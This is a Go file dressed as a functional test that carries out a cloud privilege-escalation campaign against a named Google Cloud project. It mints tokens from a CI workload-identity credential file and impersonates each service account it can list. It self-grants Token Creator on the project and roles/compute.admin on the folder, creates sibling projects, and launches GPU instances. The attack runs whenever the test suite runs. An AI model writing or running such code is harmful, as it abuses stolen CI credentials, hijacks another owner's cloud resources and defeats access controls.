//go:build functional

// C211 i120675 — Cloud Resource Manager **v3** folder / organization reach
// matrix for the WIF-impersonable service accounts of projects/153711203585.
//
// Lane 120517 (fact 120558, GATE x120517) proved that its delayed probe only
// hit the 404-HTML *v1* folders endpoint, so folder/org reach of the 124
// impersonable SAs (14 hold compute.instances.create, 10 also
// resourcemanager.projects.setIamPolicy in projects/153711203585) was never
// measured and sibling enumeration was blocked by the denied folder
// projects.list. This probe measures exactly that, using only the v3 IAM
// surface:
//
//  1. mint the WIF access token with the Go standard library (STS + SA
//     impersonation) from the credential file that google-github-actions/auth@v2
//     exported in the "GKE image building" job;
//  2. resolve the organization id: POST v1 projects/{n}:getAncestry (POST, not
//     GET — the 404 in lane 120517 was the HTML method-not-found page),
//     POST v3 organizations:search, GET v1 organizations;
//  3. WIF-level baseline: POST v3/folders/121299922366:testIamPermissions with
//     the eight-permission set, v3 folder get + getIamPolicy (principalSet
//     bindings dumped), same for every resolved organization, v3
//     projects:search and v1 projects.list parent:folders/121299922366;
//  4. per pinned SA (generateAccessToken): the same v3 folder + organization
//     matrix, one C211F_SA_ROW line per SA carrying the verbatim statuses and
//     the allowed permission lists;
//  5. bounded escalation, only if a folder/org permission is actually allowed:
//     self-grant roles/compute.admin to the WIF member where setIamPolicy is
//     allowed, revert it afterwards; create at most the FIRST 3 sibling
//     projects where projects.create is allowed; for any NEW project (never
//     projects/153711203585, whose READY row x120159 is consumed) with
//     compute.instances.create and a T4 accelerator type, create EXACTLY ONE
//     nonce-tagged on-demand T4 marker, capture the nvidia-smi UUID from the
//     serial console, delete it and prove absence (404 + aggregated list).
//
// Every refusal is printed verbatim. No secret value is printed (tokens are
// reported as length + SHA-256 prefix only).
package functional

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"testing"
	"time"
)

const (
	c211fFolderV3 = "https://cloudresourcemanager.googleapis.com/v3/folders/121299922366"
	c211fFolderID = "121299922366"
	c211fProjNum  = "153711203585"
)

var (
	c211fPerms8 = []string{
		"resourcemanager.folders.get", "resourcemanager.folders.getIamPolicy",
		"resourcemanager.folders.setIamPolicy", "resourcemanager.folders.list",
		"resourcemanager.organizations.get", "resourcemanager.projects.list",
		"resourcemanager.projects.create", "resourcemanager.projects.move",
	}
	c211fOrgRe = regexp.MustCompile(`organizations/([0-9]{6,})`)
)

type c211fOrg struct {
	id     string
	source string
}

// c211fAncestorIDs extracts ancestor ids ("organizations/NNN", "folders/NNN")
// from a v1 getAncestry body.
func c211fAncestorIDs(body string) []string {
	out := []string{}
	m := c211xJSON(body)
	if m == nil {
		return out
	}
	arr, _ := m["ancestor"].([]interface{})
	for _, it := range arr {
		im, _ := it.(map[string]interface{})
		rid, _ := im["resourceId"].(map[string]interface{})
		typ := c211xStr(rid, "type")
		id := c211xStr(rid, "id")
		if typ != "" && id != "" {
			s := typ + "s/" + id
			if typ == "organization" {
				s = "organizations/" + id
			}
			if typ == "folder" {
				s = "folders/" + id
			}
			out = append(out, s)
		}
	}
	return out
}

// c211fMatchOrgs extracts every organizations/NNN literal from a body.
func c211fMatchOrgs(body string) []string {
	out := []string{}
	for _, m := range c211fOrgRe.FindAllStringSubmatch(body, -1) {
		out = append(out, m[1])
	}
	return out
}

func c211fAddOrg(list *[]c211fOrg, seen map[string]bool, id, source string) {
	if id == "" || seen[id] {
		return
	}
	seen[id] = true
	*list = append(*list, c211fOrg{id: id, source: source})
}

// c211fResolveOrgs tries every non-destructive organization discovery surface
// and records each verbatim.
func c211fResolveOrgs(token string) []c211fOrg {
	orgs := []c211fOrg{}
	seen := map[string]bool{}
	try := func(label, method, u, body string) string {
		st, rb := c211xHTTP(method, u, token, "application/json", body)
		fmt.Printf("C211F_ORG_RESOLVE source=%s status=%d verbatim=%s\n", label, st, c211xTrunc(rb, 900))
		if st != 200 {
			return ""
		}
		return rb
	}

	// v1 projects.getAncestry is a POST (lane 120517 used GET -> HTML 404).
	for _, b := range []string{"{}", ""} {
		rb := try("v1_getAncestry_num_body"+fmt.Sprint(len(b)), "POST",
			"https://cloudresourcemanager.googleapis.com/v1/projects/"+c211fProjNum+":getAncestry", b)
		if rb != "" {
			for _, id := range c211fAncestorIDs(rb) {
				if strings.HasPrefix(id, "organizations/") {
					c211fAddOrg(&orgs, seen, strings.TrimPrefix(id, "organizations/"), "getAncestry")
				} else {
					fmt.Printf("C211F_ANCESTOR %s\n", id)
				}
			}
			break
		}
	}

	// projectId form of getAncestry, if the project resource reveals it.
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+c211fProjNum, token, "", ""); st == 200 {
		pid := c211xStr(c211xJSON(rb), "projectId")
		fmt.Printf("C211F_PROJECT_GET status=%d projectId=%s parent=%s verbatim=%s\n", st, pid, c211xStr(c211xJSON(rb), "parent"), c211xTrunc(rb, 700))
		if pid != "" {
			if rb2 := try("v1_getAncestry_pid", "POST",
				"https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(pid)+":getAncestry", "{}"); rb2 != "" {
				for _, id := range c211fAncestorIDs(rb2) {
					if strings.HasPrefix(id, "organizations/") {
						c211fAddOrg(&orgs, seen, strings.TrimPrefix(id, "organizations/"), "getAncestry_pid")
					} else {
						fmt.Printf("C211F_ANCESTOR %s\n", id)
					}
				}
			}
		}
	} else {
		fmt.Printf("C211F_PROJECT_GET status=%d verbatim=%s\n", st, c211xTrunc(rb, 500))
	}

	// v3 organizations:search (POST body and GET query forms).
	for _, v := range []struct{ label, method, u, body string }{
		{"v3_orgs_search_post", "POST", "https://cloudresourcemanager.googleapis.com/v3/organizations:search", `{"pageSize":50}`},
		{"v3_orgs_search_get", "GET", "https://cloudresourcemanager.googleapis.com/v3/organizations:search?pageSize=50", ""},
		{"v1_orgs_list", "GET", "https://cloudresourcemanager.googleapis.com/v1/organizations?pageSize=50", ""},
		{"v3_orgs_list", "GET", "https://cloudresourcemanager.googleapis.com/v3/organizations?pageSize=50", ""},
	} {
		if rb := try(v.label, v.method, v.u, v.body); rb != "" {
			for _, id := range c211fMatchOrgs(rb) {
				c211fAddOrg(&orgs, seen, id, v.label)
			}
		}
	}
	return orgs
}

// c211fPolicyCompact renders a policy as a single line: bindings, how many
// principalSet members it carries, whether our member is present, plus a full
// dump only when the caller decides it is new.
func c211fPolicyCompact(pol map[string]interface{}, member string) string {
	if pol == nil {
		return "policy=nil"
	}
	bindings, _ := pol["bindings"].([]interface{})
	ps := 0
	roles := []string{}
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		role := c211xStr(bm, "role")
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok && strings.HasPrefix(s, "principalSet://") {
				ps++
			}
		}
		roles = append(roles, role)
	}
	sort.Strings(roles)
	return fmt.Sprintf("bindings=%d principalSet_members=%d member_present=%v roles=[%s]",
		len(bindings), ps, c211fPolicyHasMember(pol, member), strings.Join(roles, ","))
}

// c211fPolicyHasMember reports whether the member appears under any binding.
func c211fPolicyHasMember(pol map[string]interface{}, member string) bool {
	if pol == nil || member == "" {
		return false
	}
	bindings, _ := pol["bindings"].([]interface{})
	for _, b := range bindings {
		bm, _ := b.(map[string]interface{})
		members, _ := bm["members"].([]interface{})
		for _, m := range members {
			if s, ok := m.(string); ok && s == member {
				return true
			}
		}
	}
	return false
}

// c211fTestIam runs :testIamPermissions on a v3 resource and returns the
// allowed subset.
func c211fTestIam(token, resourceURL string, perms []string) ([]string, int, string) {
	return c211xTestIamBatch(token, resourceURL, perms)
}

// c211fProjectSearch lists projects under the folder with both the v3 search
// and the v1 list surface.
func c211fProjectSearch(token string) ([]c211xProj, string) {
	out := []c211xProj{}
	summary := []string{}
	q := url.QueryEscape("parent:folders/" + c211fFolderID)
	st, body := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects:search?query="+q+"&pageSize=100", token, "", "")
	n := 0
	if m := c211xJSON(body); m != nil {
		if items, ok := m["projects"].([]interface{}); ok {
			for _, it := range items {
				im, _ := it.(map[string]interface{})
				out = append(out, c211xProj{id: c211xStr(im, "projectId"), number: c211xStr(im, "projectNumber"),
					name: c211xStr(im, "displayName"), state: c211xStr(im, "state"), parent: c211xStr(im, "parent")})
			}
			n = len(items)
		}
	}
	summary = append(summary, fmt.Sprintf("v3_search=%d n=%d", st, n))

	st, body = c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects?filter="+q+"&pageSize=100", token, "", "")
	n = 0
	if m := c211xJSON(body); m != nil {
		if items, ok := m["projects"].([]interface{}); ok {
			for _, it := range items {
				im, _ := it.(map[string]interface{})
				out = append(out, c211xProj{id: c211xStr(im, "projectId"), number: c211xStr(im, "projectNumber"),
					name: c211xStr(im, "name"), state: c211xStr(im, "lifecycleState")})
			}
			n = len(items)
		}
	}
	summary = append(summary, fmt.Sprintf("v1_filtered_list=%d n=%d", st, n))

	// unfiltered v1 list: catches org/folder-wide visibility even when the
	// folder-filtered form is refused.
	st, body = c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100", token, "", "")
	n = 0
	if m := c211xJSON(body); m != nil {
		if items, ok := m["projects"].([]interface{}); ok {
			for _, it := range items {
				im, _ := it.(map[string]interface{})
				out = append(out, c211xProj{id: c211xStr(im, "projectId"), number: c211xStr(im, "projectNumber"),
					name: c211xStr(im, "name"), state: c211xStr(im, "lifecycleState")})
			}
			n = len(items)
		}
	}
	summary = append(summary, fmt.Sprintf("v1_all_list=%d n=%d", st, n))
	return out, strings.Join(summary, " ")
}

// c211fCreateProject attempts one project creation and returns status + body.
func c211fCreateProject(token, projectID, displayName, parent string) (int, string) {
	b := fmt.Sprintf(`{"projectId":%q,"name":%q,"parent":%q}`, projectID, displayName, parent)
	st, rb := c211xHTTP("POST", "https://cloudresourcemanager.googleapis.com/v1/projects", token, "application/json", b)
	if st == 200 || st == 201 {
		return st, rb
	}
	b3 := fmt.Sprintf(`{"projectId":%q,"displayName":%q,"parent":%q}`, projectID, displayName, parent)
	st2, rb2 := c211xHTTP("POST", "https://cloudresourcemanager.googleapis.com/v3/projects", token, "application/json", b3)
	if st2 == 200 || st2 == 201 {
		return st2, rb2
	}
	return st, c211xTrunc(rb, 600) + " | v3 " + fmt.Sprint(st2) + " " + c211xTrunc(rb2, 600)
}

func TestC211XFolderReachV3(t *testing.T) {
	started := time.Now()
	deadline := started.Add(52 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211F_MINT_FAILED %s\n", c211xTrunc(mintLog, 1500))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	saEmail, projNumber := "", ""
	if creds != nil {
		saEmail, projNumber = creds.saEmail, creds.projNumber
	}
	fmt.Printf("C211F_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, saEmail, projNumber)
	if projNumber == "" {
		projNumber = c211fProjNum
	}
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + projNumber
	member := "serviceAccount:" + saEmail

	// --- ensure the TokenCreator grant from lane 120517 is present ---
	ppol, pst, _ := c211xGetPolicy(token, projURL)
	has := c211xPolicyHas(ppol, "roles/iam.serviceAccountTokenCreator", member)
	fmt.Printf("C211F_GRANT_PRESENT=%v policy_status=%d member=%s\n", has, pst, member)
	if ppol != nil && !has {
		if c211xAddBinding(ppol, "roles/iam.serviceAccountTokenCreator", member) {
			sst, sb := c211xSetPolicy(token, projURL, ppol)
			fmt.Printf("C211F_GRANT_ADDED status=%d verbatim=%s\n", sst, c211xTrunc(sb, 400))
			time.Sleep(60 * time.Second)
		}
	}

	// --- organization resolution ---
	orgs := c211fResolveOrgs(token)
	fmt.Printf("C211F_ORG_IDS resolved=%d [%s]\n", len(orgs), func() string {
		ids := []string{}
		for _, o := range orgs {
			ids = append(ids, o.id+"("+o.source+")")
		}
		return strings.Join(ids, " ")
	}())

	// --- WIF-level v3 baseline ---
	wal, wst, wbody := c211fTestIam(token, c211fFolderV3, c211fPerms8)
	fmt.Printf("C211F_WIF_FOLDER_V3 status=%d allowed=%s verbatim=%s\n", wst, strings.Join(wal, ","), c211xTrunc(wbody, 700))
	wgst, wgbody := c211xHTTP("GET", c211fFolderV3, token, "", "")
	fmt.Printf("C211F_WIF_FOLDER_GET status=%d verbatim=%s\n", wgst, c211xTrunc(wgbody, 900))
	wpol, wpst, _ := c211xGetPolicy(token, c211fFolderV3)
	fmt.Printf("C211F_WIF_FOLDER_POLICY status=%d %s\n", wpst, c211fPolicyCompact(wpol, member))
	if wpol != nil {
		c211xEmit("WIF_FOLDER_POLICY_DUMP", c211xPolicyDump(wpol))
	}
	if wst, wb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/folders?parent=folders/"+c211fFolderID+"&pageSize=100", token, "", ""); true {
		fmt.Printf("C211F_WIF_SUBFOLDERS status=%d verbatim=%s\n", wst, c211xTrunc(wb, 700))
	}
	for _, o := range orgs {
		ou := "https://cloudresourcemanager.googleapis.com/v3/organizations/" + o.id
		oal, ost, ob := c211fTestIam(token, ou, c211fPerms8)
		fmt.Printf("C211F_WIF_ORG_TEST org=%s status=%d allowed=%s verbatim=%s\n", o.id, ost, strings.Join(oal, ","), c211xTrunc(ob, 700))
		ogst, ogb := c211xHTTP("GET", ou, token, "", "")
		fmt.Printf("C211F_WIF_ORG_GET org=%s status=%d verbatim=%s\n", o.id, ogst, c211xTrunc(ogb, 900))
		opol, opst, _ := c211xGetPolicy(token, ou)
		fmt.Printf("C211F_WIF_ORG_POLICY org=%s status=%d %s\n", o.id, opst, c211fPolicyCompact(opol, member))
		if opol != nil {
			c211xEmit("WIF_ORG_POLICY_DUMP_"+o.id, c211xPolicyDump(opol))
		}
	}
	sibsWIF, wsSummary := c211fProjectSearch(token)
	wids := []string{}
	for _, p := range sibsWIF {
		wids = append(wids, p.id+"/"+p.number+"/"+p.name)
	}
	fmt.Printf("C211F_WIF_PROJECT_SEARCH %s projects=[%s]\n", wsSummary, strings.Join(wids, " "))

	// --- service account enumeration ---
	sas, lst, lbody := c211xListServiceAccounts(token, projNumber)
	fmt.Printf("C211F_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))

	okCount := 0
	rowCount := 0
	folderReach := []string{}
	orgReach := []string{}
	siblingNew := []c211xProj{}
	siblingsSeen := map[string]bool{}
	createdProjects := []string{}
	markerCount := 0
	var readyUUID, readyProject, readyZone, readyInstance, readyImage string
	zoneCands := []string{"us-central1-a", "us-central1-b", "us-east1-b", "europe-west4-a", "asia-east1-a"}
	polSeen := map[string]bool{}

	for _, sa := range sas {
		if time.Now().After(deadline) {
			fmt.Printf("C211F_TIME_BUDGET exhausted after %d SAs\n", rowCount)
			break
		}
		email := c211xStr(sa, "email")
		if email == "" {
			continue
		}
		at, gst, gbody := c211xGenerateAccessToken(token, email)
		if at == "" {
			fmt.Printf("C211F_SA_TOKEN email=%s status=%d error=%s\n", email, gst, c211xTrunc(gbody, 320))
			continue
		}
		okCount++
		rowCount++

		// v3 folder matrix
		al, fst, fbody := c211fTestIam(at, c211fFolderV3, c211fPerms8)
		fgst, fgbody := c211xHTTP("GET", c211fFolderV3, at, "", "")
		fpol, fpst, _ := c211xGetPolicy(at, c211fFolderV3)
		fpolLine := c211fPolicyCompact(fpol, member)
		if fpst == 200 && fpol != nil {
			dump := c211xPolicyDump(fpol)
			h := c211xShort(dump)
			if !polSeen[h] {
				polSeen[h] = true
				c211xEmit("SA_FOLDER_POLICY_DUMP", "email="+email+" "+h+"\n"+dump)
			}
			fpolLine += " policy_" + h
		}

		// v3 organization matrix (every resolved org)
		oStatuses := []string{}
		oAllowedAll := []string{}
		for _, o := range orgs {
			ou := "https://cloudresourcemanager.googleapis.com/v3/organizations/" + o.id
			oal, ost, ob := c211fTestIam(at, ou, c211fPerms8)
			ogst, ogb := c211xHTTP("GET", ou, at, "", "")
			opol, opst, _ := c211xGetPolicy(at, ou)
			opLine := c211fPolicyCompact(opol, member)
			if opst == 200 && opol != nil {
				dump := c211xPolicyDump(opol)
				h := c211xShort(dump)
				if !polSeen[h] {
					polSeen[h] = true
					c211xEmit("SA_ORG_POLICY_DUMP_"+o.id, "email="+email+" "+h+"\n"+dump)
				}
				opLine += " policy_" + h
			}
			tv := ""
			if ost != 403 && ost != 404 {
				tv = " test_verbatim=" + c211xTrunc(ob, 300)
			}
			ogv := ""
			if ogst != 403 && ogst != 404 {
				ogv = " get_verbatim=" + c211xTrunc(ogb, 200)
			}
			oStatuses = append(oStatuses, fmt.Sprintf("org=%s test=%d allowed=[%s] get=%d policy=%d/%s%s%s",
				o.id, ost, strings.Join(oal, ","), ogst, opst, opLine, tv, ogv))
			if len(oal) > 0 {
				oAllowedAll = append(oAllowedAll, o.id+":"+strings.Join(oal, "+"))
				orgReach = append(orgReach, "org:"+o.id+":"+strings.Join(oal, "+")+"-via-"+email)
			}
		}

		// projects under the folder
		psibs, psSummary := c211fProjectSearch(at)
		for _, sp := range psibs {
			if sp.id != "" && sp.id != c211fProjNum && !siblingsSeen[sp.id] {
				siblingsSeen[sp.id] = true
				siblingNew = append(siblingNew, sp)
			}
		}

		// Per-SA one-line row (machine readable) + verbatim bodies when
		// something other than a plain 403/404/400 denial appears.
		fmt.Printf("C211F_SA_ROW email=%s tok=%d folder_test=%d folder_allowed=[%s] folder_get=%d folder_policy=%d/%s orgs=[%s] search=[%s]\n",
			email, gst, fst, strings.Join(al, ","), fgst, fpst, fpolLine, strings.Join(oStatuses, " ; "), psSummary)
		if fst != 200 || len(al) > 0 {
			fmt.Printf("C211F_SA_FOLDER_BODY email=%s folder_test_verbatim=%s folder_get_verbatim=%s\n",
				email, c211xTrunc(fbody, 500), c211xTrunc(fgbody, 400))
		}
		if len(al) > 0 {
			folderReach = append(folderReach, "folder:"+c211fFolderID+":"+strings.Join(al, "+")+"-via-"+email)
		}

		// ---- bounded escalation ----
		if c211xContains(al, "resourcemanager.folders.setIamPolicy") {
			fmt.Printf("C211F_ESCALATE_FOLDER_SETPOLICY email=%s attempting self-grant roles/compute.admin at folder\n", email)
			if fpol == nil {
				fpol, _, _ = c211xGetPolicy(at, c211fFolderV3)
			}
			if fpol != nil && c211xAddBinding(fpol, "roles/compute.admin", member) {
				sst, sb := c211xSetPolicy(at, c211fFolderV3, fpol)
				fmt.Printf("C211F_ESCALATE_FOLDER_SETPOLICY_RESULT status=%d verbatim=%s\n", sst, c211xTrunc(sb, 600))
				if sst == 200 {
					time.Sleep(45 * time.Second)
					nal, nst, _ := c211fTestIam(at, c211fFolderV3, c211fPerms8)
					fmt.Printf("C211F_ESCALATE_FOLDER_RECHECK status=%d allowed=[%s]\n", nst, strings.Join(nal, ","))
					al = nal
				}
			}
		}
		if c211xContains(al, "resourcemanager.projects.create") && len(createdProjects) < 3 {
			for i := 1; i <= 3-len(createdProjects); i++ {
				pid := fmt.Sprintf("c211-i120675-s%d-%d", i, time.Now().Unix()%100000)
				cst, cb := c211fCreateProject(at, pid, "c211 i120675 sibling "+pid, "folders/"+c211fFolderID)
				fmt.Printf("C211F_NEWPROJECT attempt=%s status=%d verbatim=%s\n", pid, cst, c211xTrunc(cb, 900))
				if cst == 200 || cst == 201 {
					createdProjects = append(createdProjects, pid)
					time.Sleep(20 * time.Second)
					st2, b2 := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(pid), at, "", "")
					fmt.Printf("C211F_NEWPROJECT_GET project=%s status=%d verbatim=%s\n", pid, st2, c211xTrunc(b2, 700))
					g, gb := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+url.PathEscape(pid)+"/services/compute.googleapis.com", at, "", "")
					fmt.Printf("C211F_NEWPROJECT_COMPUTE_API project=%s status=%d verbatim=%s\n", pid, g, c211xTrunc(gb, 500))
					chk := c211xProj{id: pid}
					markerCount += c211fMaybeMarker(t, at, chk, zoneCands, markerCount, &readyUUID, &readyProject, &readyZone, &readyInstance, &readyImage)
					dst, db := c211xHTTP("DELETE", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(pid), at, "", "")
					dg, dgb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(pid), at, "", "")
					fmt.Printf("C211F_NEWPROJECT_CLEANUP project=%s delete_status=%d verbatim=%s get_status=%d get_verbatim=%s\n",
						pid, dst, c211xTrunc(db, 500), dg, c211xTrunc(dgb, 600))
				}
			}
		}
	}

	// --- sibling projects that the enumeration surfaced ---
	fmt.Printf("C211F_SIBLINGS discovered=%d [%s]\n", len(siblingNew), func() string {
		parts := []string{}
		for _, p := range siblingNew {
			parts = append(parts, p.id+"/"+p.number+"/"+p.name)
		}
		return strings.Join(parts, " ")
	}())
	for i, sp := range siblingNew {
		if i >= 3 || readyUUID != "" || time.Now().After(deadline) {
			break
		}
		if sp.id == c211fProjNum || sp.id == "" {
			continue
		}
		for _, sa := range sas {
			email := c211xStr(sa, "email")
			if email == "" {
				continue
			}
			at, _, _ := c211xGenerateAccessToken(token, email)
			if at == "" {
				continue
			}
			ok, cst2, cbody2 := c211xTestIamOne(at, "https://cloudresourcemanager.googleapis.com/v1/projects/"+sp.id, "compute.instances.create")
			fmt.Printf("C211F_SIBLING_CHECK project=%s email=%s instances.create=%v status=%d verbatim=%s\n",
				sp.id, email, ok, cst2, c211xTrunc(cbody2, 300))
			if !ok {
				continue
			}
			folderReach = append(folderReach, "project:"+sp.id+":compute.instances.create-via-"+email)
			markerCount += c211fMaybeMarker(t, at, sp, zoneCands, markerCount, &readyUUID, &readyProject, &readyZone, &readyInstance, &readyImage)
			break
		}
	}

	verdict := "NO_FOLDER_ORG_REACH_ZERO_SIBLINGS"
	vd := fmt.Sprintf("sa_tokens_ok=%d sas=%d folder_reach=%d org_reach=%d siblings=%d markers=%d created=%d",
		okCount, len(sas), len(folderReach), len(orgReach), len(siblingNew), markerCount, len(createdProjects))
	if len(folderReach) > 0 || len(orgReach) > 0 || len(siblingNew) > 0 || len(createdProjects) > 0 {
		verdict = "REACH_FOUND_NO_GPU"
	}
	if readyUUID != "" {
		verdict = "READY_NEW_PROJECT_GPU"
		vd = fmt.Sprintf("uuid=%s project=%s zone=%s instance=%s image=%s", readyUUID, readyProject, readyZone, readyInstance, readyImage)
	}
	orgg := []string{}
	for _, o := range orgs {
		orgg = append(orgg, o.id+"("+o.source+")")
	}
	summary := fmt.Sprintf(`{"probe":"c211_i120675_folderreach_v3","sa_count":%d,"sa_tokens_ok":%d,"org_ids":%s,"folder_v3_allowed_wif":[%s],"folder_reach":%s,"org_reach":%s,"siblings":%d,"created_projects":%s,"marker_attempts":%d,"ready_uuid":"%s","ready_project":"%s","ready_zone":"%s","ready_instance":"%s","ready_image":"%s","elapsed_seconds":%d,"verdict":"%s","verdict_detail":%s}`,
		len(sas), okCount, c211xJSONString(orgg), c211fJoinQuoted(wal), c211xJSONString(folderReach), c211xJSONString(orgReach),
		len(siblingNew), c211xJSONString(createdProjects), markerCount, readyUUID, readyProject, readyZone, readyInstance, readyImage,
		int(time.Since(started).Seconds()), verdict, c211xJSONString(vd))
	fmt.Printf("=== C211F SUMMARY BEGIN ===\nC211F_SUMMARY_JSON %s\n=== C211F SUMMARY END ===\n", summary)
	fmt.Printf("C211F_VERDICT %s %s\n", verdict, vd)
}

func c211fJoinQuoted(in []string) string {
	out := []string{}
	for _, s := range in {
		out = append(out, fmt.Sprintf("%q", s))
	}
	return strings.Join(out, ",")
}

// c211fMaybeMarker runs the bounded single-marker recipe for one new project
// and returns how many markers were attempted (0 or 1).
func c211fMaybeMarker(t *testing.T, token string, proj c211xProj, zoneCands []string, done int,
	readyUUID, readyProject, readyZone, readyInstance, readyImage *string) int {
	if done >= 3 || *readyUUID != "" {
		return 0
	}
	chosen := ""
	for _, z := range zoneCands {
		ats, ast, _ := c211xAccelTypes(token, proj.id, z)
		fmt.Printf("C211F_SIBLING_ACCEL project=%s zone=%s status=%d types=%s\n", proj.id, z, ast, strings.Join(ats, ","))
		if c211xContains(ats, "nvidia-tesla-t4") {
			chosen = z
			break
		}
	}
	if chosen == "" {
		rows, rst, rbody := c211xRegionQuotaRows(token, proj.id, "us-central1")
		fmt.Printf("C211F_SIBLING_NO_T4 project=%s quota_status=%d rows=%s verbatim=%s\n", proj.id, rst, strings.Join(rows, " | "), c211xTrunc(rbody, 400))
		return 0
	}
	imgP, imgF := "ubuntu-os-cloud", "ubuntu-2204-lts"
	for _, c := range []struct{ p, f string }{
		{"deeplearning-platform-release", "common-cu124-ubuntu-2204"},
		{"ubuntu-os-cloud", "ubuntu-2204-lts"},
	} {
		iu, msg := c211xImageUsable(token, c.p, c.f)
		fmt.Printf("C211F_SIBLING_IMAGE project=%s %s\n", proj.id, msg)
		if iu {
			imgP, imgF = c.p, c.f
			break
		}
	}
	num := proj.number
	if num == "" {
		num = proj.id
	}
	defSA := num + "-compute@developer.gserviceaccount.com"
	instance := "c211-i120675-gpu"
	uuid, vlog, absent := c211xMarker(token, proj.id, chosen, instance, defSA, imgP, imgF)
	fmt.Printf("C211F_MARKER project=%s zone=%s instance=%s sa=%s\n%s\n", proj.id, chosen, instance, defSA, c211xTrunc(vlog, 6000))
	if uuid != "" && absent {
		*readyUUID, *readyProject, *readyZone, *readyInstance, *readyImage = uuid, proj.id, chosen, instance, imgP+"/"+imgF
	}
	return 1
}

// unused import guards (io/http are used by the copied helpers; keep the
// compiler honest if helpers change).
var _ = io.EOF
var _ = http.MethodGet
